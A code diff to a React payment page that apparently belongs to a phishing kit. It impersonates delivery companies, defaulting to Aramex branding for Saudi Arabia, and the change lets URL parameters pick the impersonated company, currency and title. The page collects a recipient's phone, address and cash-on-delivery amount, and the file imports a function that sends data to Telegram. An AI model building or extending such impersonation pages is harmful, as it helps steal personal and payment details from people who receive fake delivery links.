@@ -8,6 +8,7 @@ import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -37,9 +38,15 @@ const PaymentRecipient = () => {
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
 
-  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+  // Get query parameters from URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+  const currencyParam = urlParams.get('currency');
+  const titleParam = urlParams.get('title');
+
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyMeta = getCompanyMeta(serviceKey);
 
   const shippingInfo = linkData?.payload as any;
 
@@ -47,6 +54,9 @@ const PaymentRecipient = () => {
   const countryCode = shippingInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
+
+  // Use currency from URL parameter if available, otherwise from country data
+  const currencyCode = currencyParam || countryData?.currency || "SAR";
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
@@ -64,7 +74,7 @@ const PaymentRecipient = () => {
     }
   }
 
-  const formattedAmount = formatCurrency(amount, countryCode);
+  const formattedAmount = formatCurrency(amount, currencyCode);
 
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
   
